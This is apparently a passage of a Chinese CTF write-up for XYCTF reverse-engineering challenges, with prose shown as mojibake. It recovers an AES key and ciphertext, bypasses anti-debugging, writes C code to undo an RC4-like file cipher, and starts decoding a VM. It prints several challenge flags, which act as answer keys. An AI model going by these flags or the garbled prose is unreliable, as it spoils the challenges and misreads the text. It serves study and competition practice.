language</h4><p>è¿™ä¸ªé¢˜å¥½å‘å•Šï¼ï¼QAQ</p><p>å…ˆé€šè¿‡e-decomplineræ’ä»¶æ‰¾åˆ°ä¸»è¦ç›®çš„åœ°</p><p>å¯ä»¥çœ‹åˆ°æ˜¯aes</p><p>æœ€åçš„åˆ¤æ–­æ˜¯</p><p><img src="https://s2.loli.net/2024/04/18/LKfxNsRWCpMVqkP.png" alt="image-20240418095501581"></p><p>æ ¹æ®signseacheræ‰«æç»“æœï¼Œå‘ç°æœ‰åè°ƒè¯•ï¼Œé€šè¿‡é™„åŠ è°ƒè¯•è·³è¿‡</p><p>åœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 = å­—èŠ‚é›†æ¯”è¾ƒ((_BYTE *)byte_59D0F4 + <span class="number">8</span>, encoded, v3);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°byte_59D0F4ä¸­çš„å€¼å³æ­£ç¡®çš„å¯†æ–‡ï¼Œ</p><p>åœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mode = <span class="string">&quot;AES-ECB&quot;</span>;</span><br><span class="line"> v9 = sub_401975((<span class="type">int</span> *)&amp;checknum, (_DWORD **)&amp;key, (<span class="type">char</span> **)&amp;mode, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, &amp;v11, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ä¸­å¾—åˆ°key</p><p>ä¸¢è¿›åœ¨çº¿å·¥å…·è§£å¯†aes</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RZy/zVEWMFxaCbzChAg<span class="number">8</span><span class="keyword">x</span><span class="number">26</span>XZYr<span class="number">51</span>rNVnM+zBoBp<span class="number">3</span>gya<span class="number">93</span>L<span class="number">9</span>QQXpFRin<span class="number">1</span>JE<span class="number">33</span>vyx</span><br><span class="line">welcometoxyctf!!</span><br><span class="line">XYCTF&#123;y<span class="number">0</span>u_<span class="title">@r3_v3ry_g00d_a7_E_l</span><span class="title">@ngu</span><span class="title">@ge</span>&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼šå¦‚æœé‡åˆ°å¥‡æ€ªçš„å­—ç¬¦ä¸²ï¼Œåƒæ˜¯éƒ¨åˆ†ä¸å¯¹çš„ï¼Œä»¥åŠæœ‰fake_flagå¯èƒ½æœ‰åè°ƒè¯•</p><h4 id="é¦’å¤´">é¦’å¤´</h4><p>æ•°æ®ç»“æ„ï¼Œç›´æ¥æŒ‰ans1æŠŠæ ‘ç”»å‡ºæ¥ï¼Œç›´æ¥ç”»å°±å¥½ï¼Œ</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;xaf1svut7rojh3de0&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week4">week4</h3><h4 id="find-me">find_me</h4><p>ä¸€å…±æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œåªæœ‰4å·æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰“å¼€åˆ†æï¼Œå‘ç°æ˜¯æŠŠ3å·åŠ å¯†æˆ1å·ï¼Œé‚£ä¹ˆå°è¯•è¿˜åŸ3å·ï¼Œæ³¨æ„å…¶ä¸­ä½¿ç”¨äº†randï¼Œæ‰€ä»¥åº”è¯¥å†™cä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">FILE* inputFile, * outputFile;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">512</span>] = &#123; <span class="number">0xF3</span>, <span class="number">0x75</span>, <span class="number">0xC9</span>, <span class="number">0xB4</span>, <span class="number">0x2A</span>, <span class="number">0x3A</span>, <span class="number">0x9A</span>, <span class="number">0x90</span>, <span class="number">0xBE</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0xD3</span>, <span class="number">0xF0</span>, <span class="number">0x46</span>, <span class="number">0xA5</span>, <span class="number">0x32</span>, <span class="number">0xCE</span>, <span class="number">0x4B</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0xEF</span>, <span class="number">0x96</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xC7</span>, <span class="number">0x68</span>, <span class="number">0x53</span>, <span class="number">0x6E</span>, <span class="number">0xD9</span>, <span class="number">0x0D</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0xCD</span>, <span class="number">0x87</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0xE9</span>, <span class="number">0x93</span>, <span class="number">0x7B</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0xDE</span>, <span class="number">0x8E</span>, <span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0xA6</span>, <span class="number">0xC8</span>, <span class="number">0x94</span>, <span class="number">0x7E</span>, <span class="number">0xFD</span>, <span class="number">0x4F</span>, <span class="number">0xFD</span>, <span class="number">0xAD</span>, <span class="number">0x2B</span>, <span class="number">0x51</span>, <span class="number">0x28</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0xA1</span>, <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0x6D</span>, <span class="number">0x6B</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>, <span class="number">0x3E</span>, <span class="number">0x20</span>, <span class="number">0xFA</span>, <span class="number">0xDC</span>, <span class="number">0x07</span>, <span class="number">0xA3</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x8C</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0x3C</span>, <span class="number">0xCE</span>, <span class="number">0x2D</span>, <span class="number">0x18</span>, <span class="number">0xE3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>, <span class="number">0xBC</span>, <span class="number">0xCA</span>, <span class="number">0xB7</span>, <span class="number">0xB4</span>, <span class="number">0x03</span>, <span class="number">0x5B</span>, <span class="number">0xF0</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0xF2</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x42</span>, <span class="number">0xB3</span>, <span class="number">0x39</span>, <span class="number">0x91</span>, <span class="number">0x67</span>, <span class="number">0x23</span>, <span class="number">0x16</span>, <span class="number">0xEA</span>, <span class="number">0x88</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0xDA</span>, <span class="number">0xDF</span>, <span class="number">0xD0</span>, <span class="number">0xF5</span>, <span class="number">0x09</span>, <span class="number">0x23</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x13</span>, <span class="number">0x85</span>, <span class="number">0xBD</span>, <span class="number">0x3D</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0xE4</span>, <span class="number">0x82</span>, <span class="number">0x06</span>, <span class="number">0xBB</span>, <span class="number">0x7B</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0xD9</span>, <span class="number">0xF6</span>, <span class="number">0x1E</span>, <span class="number">0x09</span>, <span class="number">0x58</span>, <span class="number">0x1A</span>, <span class="number">0xD8</span>, <span class="number">0xFE</span>, <span class="number">0x29</span>, <span class="number">0x8C</span>, <span class="number">0xBF</span>, <span class="number">0x54</span>, <span class="number">0xAF</span>, <span class="number">0xAE</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0xD6</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0x24</span>, <span class="number">0x97</span>, <span class="number">0x7A</span>, <span class="number">0xD7</span>, <span class="number">0x7F</span>, <span class="number">0xCB</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0xDC</span>, <span class="number">0xE0</span>, <span class="number">0x5E</span>, <span class="number">0xC9</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x4E</span>, <span class="number">0xC4</span>, <span class="number">0x90</span>, <span class="number">0xEB</span>, <span class="number">0x74</span>, <span class="number">0x6B</span>, <span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xDE</span>, <span class="number">0xA2</span>, <span class="number">0x87</span>, <span class="number">0x1A</span>, <span class="number">0xD1</span>, <span class="number">0x12</span>, <span class="number">0xC8</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x29</span>, <span class="number">0x25</span>, <span class="number">0xBA</span>, <span class="number">0xAE</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0xDB</span>, <span class="number">0xD5</span>, <span class="number">0x48</span>, <span class="number">0xFE</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x15</span>, <span class="number">0x64</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x34</span>, <span class="number">0xB5</span>, <span class="number">0xF2</span>, <span class="number">0xC5</span>, <span class="number">0x78</span>, <span class="number">0x6F</span>, <span class="number">0xC6</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0x53</span>, <span class="number">0x81</span>, <span class="number">0xFB</span>, <span class="number">0x8D</span>, <span class="number">0x40</span>, <span class="number">0xE6</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x57</span>, <span class="number">0xB7</span>, <span class="number">0x99</span>, <span class="number">0x20</span>, <span class="number">0x98</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xD8</span>, <span class="number">0x70</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0xE4</span>, <span class="number">0xB5</span>, <span class="number">0x7A</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>, <span class="number">0x3C</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0xE8</span>, <span class="number">0xF9</span>, <span class="number">0x12</span>, <span class="number">0x83</span>, <span class="number">0x2A</span>, <span class="number">0xB1</span>, <span class="number">0xC1</span>, <span class="number">0x9F</span>, <span class="number">0xF5</span>, <span class="number">0x5E</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xD7</span>, <span class="number">0x89</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0xF4</span>, <span class="number">0x68</span>, <span class="number">0xA9</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x85</span>, <span class="number">0xF8</span>, <span class="number">0xB3</span>, <span class="number">0x95</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0xB6</span>, <span class="number">0x5A</span>, <span class="number">0x54</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x16</span>, <span class="number">0x86</span>, <span class="number">0x46</span>, <span class="number">0xBE</span>, <span class="number">0x31</span>, <span class="number">0x1D</span>, <span class="number">0xCF</span>, <span class="number">0x42</span>, <span class="number">0x31</span>, <span class="number">0x59</span>, <span class="number">0xEE</span>, <span class="number">0xEA</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x7F</span>, <span class="number">0xD0</span>, <span class="number">0xB9</span>, <span class="number">0x8D</span>, <span class="number">0xED</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0xA7</span>, <span class="number">0xC1</span>, <span class="number">0x5B</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0xAC</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0xB1</span>, <span class="number">0x36</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x4D</span>, <span class="number">0x9C</span>, <span class="number">0x3E</span>, <span class="number">0x72</span>, <span class="number">0xF1</span>, <span class="number">0x1F</span>, <span class="number">0x88</span>, <span class="number">0xE5</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x0E</span>, <span class="number">0x3A</span>, <span class="number">0xE6</span>, <span class="number">0xD2</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x44</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0xEC</span>, <span class="number">0xBC</span>, <span class="number">0x47</span>, <span class="number">0xCC</span>, <span class="number">0xA6</span>, <span class="number">0x9E</span>, <span class="number">0xD2</span>, <span class="number">0x7C</span>, <span class="number">0xFB</span>, <span class="number">0x72</span>, <span class="number">0xDA</span>, <span class="number">0xA7</span>, <span class="number">0x9A</span>, <span class="number">0x86</span>, <span class="number">0x55</span>, <span class="number">0x8A</span>, <span class="number">0x76</span>, <span class="number">0x9B</span>, <span class="number">0xF3</span>, <span class="number">0x7C</span>, <span class="number">0x8F</span>, <span class="number">0x14</span>, <span class="number">0x7D</span>, <span class="number">0xC5</span>, <span class="number">0x94</span>, <span class="number">0x17</span>, <span class="number">0x8B</span>, <span class="number">0xAB</span>, <span class="number">0x15</span>, <span class="number">0xBF</span>, <span class="number">0x2E</span>, <span class="number">0xDD</span>, <span class="number">0x2C</span>, <span class="number">0xB0</span>, <span class="number">0x62</span>, <span class="number">0x89</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x21</span>, <span class="number">0x9D</span>, <span class="number">0x0C</span>, <span class="number">0xEF</span>, <span class="number">0x9E</span>, <span class="number">0xD1</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0xF7</span>, <span class="number">0x4F</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xFF</span>, <span class="number">0x6E</span>, <span class="number">0xE5</span>, <span class="number">0xEB</span>, <span class="number">0x96</span>, <span class="number">0xF9</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0x07</span>, <span class="number">0xD4</span>, <span class="number">0xA3</span>, <span class="number">0x84</span>, <span class="number">0xE3</span>, <span class="number">0x1F</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x18</span>, <span class="number">0x35</span>, <span class="number">0x41</span>, <span class="number">0x2F</span>, <span class="number">0x02</span>, <span class="number">0x66</span>, <span class="number">0x2E</span>, <span class="number">0x6F</span>, <span class="number">0x61</span>, <span class="number">0xD5</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x78</span>, <span class="number">0x1C</span>, <span class="number">0x32</span>, <span class="number">0xAB</span>, <span class="number">0xA4</span>, <span class="number">0x67</span>, <span class="number">0xC2</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0xE2</span>, <span class="number">0x2C</span>, <span class="number">0x38</span>, <span class="number">0x8E</span>, <span class="number">0xB2</span>, <span class="number">0x48</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0xD3</span>, <span class="number">0x41</span>, <span class="number">0xD6</span>, <span class="number">0x91</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0xFC</span>, <span class="number">0xFC</span>, <span class="number">0x38</span>, <span class="number">0xAC</span>, <span class="number">0xA9</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0x14</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x4B</span>, <span class="number">0x81</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0xB8</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xAF</span>, <span class="number">0x93</span>, <span class="number">0xB6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0xC2</span>, <span class="number">0xA5</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x9B</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0xC3</span>, <span class="number">0xDD</span>, <span class="number">0xED</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x74</span>, <span class="number">0xEE</span>, <span class="number">0xF7</span>, <span class="number">0x26</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>, <span class="number">0x61</span>, <span class="number">0xA4</span>, <span class="number">0xB0</span>, <span class="number">0xC0</span>, <span class="number">0x13</span>, <span class="number">0x4E</span>, <span class="number">0xA1</span>, <span class="number">0x17</span> &#125;; </span><br><span class="line"><span class="type">int</span> v8 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v9, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> v12, v13;</span><br><span class="line"></span><br><span class="line">inputFile = fopen(<span class="string">&quot;Doraemon1&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">outputFile = fopen(<span class="string">&quot;Doraemon3&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inputFile == <span class="literal">NULL</span> || outputFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æ— æ³•æ‰“å¼€æ–‡ä»¶\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!feof(inputFile)) &#123;</span><br><span class="line">v10 = (v10 + <span class="number">1</span>) % <span class="number">512</span>;</span><br><span class="line">v11 = (sbox[v10] + v11) % <span class="number">512</span>;</span><br><span class="line">v13 = sbox[v10];</span><br><span class="line">sbox[v10] = sbox[v11];</span><br><span class="line">sbox[v11] = v13;</span><br><span class="line">v12 = sbox[(<span class="type">unsigned</span> <span class="type">char</span>)((sbox[v11] + sbox[v10]) % <span class="number">512</span>)];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c = fgetc(inputFile) ^ v12;</span><br><span class="line">fputc(c, outputFile);</span><br><span class="line"></span><br><span class="line">srand(sbox[v8 % <span class="number">512</span>]);</span><br><span class="line">v9 = rand() % <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v9; ++i) &#123;</span><br><span class="line">fgetc(inputFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">++v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(inputFile);</span><br><span class="line">fclose(outputFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±è¿˜åŸäº†3ï¼Œæ‰“å¼€3çœ‹ä¸€ä¸‹ï¼Œå¥½åƒæ˜¯é€šè¿‡3ç”Ÿæˆäº†ä¸€ä¸ªhereï¼Œé‚£å°±æ‰§è¡Œä¸€ä¸‹ï¼Œæ‰“å¼€hereä¸€çœ‹ï¼Œflagå‡ºæ¥äº†</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;i_L0ve_Dor4emon_Fov3rver&#125;</span></span><br></pre></td></tr></table></figure><h4 id="èˆ”ç‹—å››éƒ¨æ›²â€“ç®€çˆ±">èˆ”ç‹—å››éƒ¨æ›²â€“ç®€çˆ±</h4><p>å…ˆçœ‹ä¸»å‡½æ•°ï¼Œå¥½åƒæ˜¯ä¸¤ä¸ªteaæ¥ç€ä¸€ä¸ªvmï¼Œä»åå¾€å‰è¯•ä¸€ä¸‹ï¼Œå…ˆè§£vm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">processCode</span><span class="params">(<span class="type">int</span>* input)</span> &#123;</span><br><span class="line"><span class="type">int</span> code[<span class="number">1802</span>]; <span class="comment">// [rsp+10h] [rbp-1C30h] BYREF</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+1C38h] [rbp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+1C3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(code, <span class="number">0</span>, <span class="number">0x1C20</span>uLL);</span><br><span class="line">code[<span class="number">32</span>] = <span class="number">2</span>;<span class="comment">//å‰32ä½¿input[0]+32,è¿™ä¸€ä¸ªiï¼Œj+1</span></span><br><span class="line">code[<span class="number">65</span>] = <span class="number">2</span>;<span class="comment">//å‰32ä½¿input[1]+32,è¿™ä¸€ä¸ªiï¼Œj+1</span></span><br><span class="line">code[<span class="number">66</span>] = <span class="number">4</span>;<span class="comment">//ä¸åä¸€ä½ç›¸åŠ å†å‡70</span></span><br><span class="line">code[<span class="number">98</span>] = <span class="number">2</span>;<span class="comment">//å‰31ä¸ªä½¿input[2]+31,è¿™ä¸€ä¸ªiï¼Œj+1</span></span><br><span class="line">code[<span class="number">99</span>] = <span class="number">5</span>;<span class="comment">//ä¸åä¸€ä½ç›¸å‡å†åŠ 70</span></span><br><span class="line">code[<span class="number">185</span>] = <span class="number">2</span>;<span class="comment">//85ä¸ªä½¿input[3]+85</span></span><br><span class="line">code[<span class="number">186</span>] = <span class="number">2</span>;<span class="comment">//è·³åˆ°ç¬¬5ä½</span></span><br><span class="line">code[<span class="number">187</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">188</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">189</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">190</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">191</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">192</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">193</span>] = <span class="number">1</span>;</span><br><span 